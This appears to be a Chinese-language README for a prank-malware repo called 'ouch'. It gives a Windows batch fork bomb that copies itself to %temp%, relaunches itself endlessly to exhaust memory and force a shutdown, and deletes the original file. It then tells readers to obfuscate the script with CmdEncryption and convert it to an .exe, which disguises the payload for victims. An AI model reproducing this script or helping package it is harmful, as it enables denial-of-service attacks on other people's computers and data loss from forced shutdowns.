# ouch
一个令电脑内存堆积 导致强制关机的bat
## 我们需要一个ouch.bat
/////手动编辑/////
```bash
(echo :ouch && echo start ouch.bat && echo goto ouch && echo color 2 && echo echo ################## I am YJ, thank u for open this bat,Yours computer will be shutdown ##################) > %temp%/ouch.bat
cd %temp% && ouch.bat
del %0`
```
记事本添加以上代码后，保存修改后缀为bat。'如果你想测试的话可以打开hhh
### CmdEncryption 加密bat文件
不用介绍了 感谢AM电脑吧:年老痴呆
#### 之后导入Bat_To_Exe_Converter将bat转换成exe
ps:language可以切换为中文
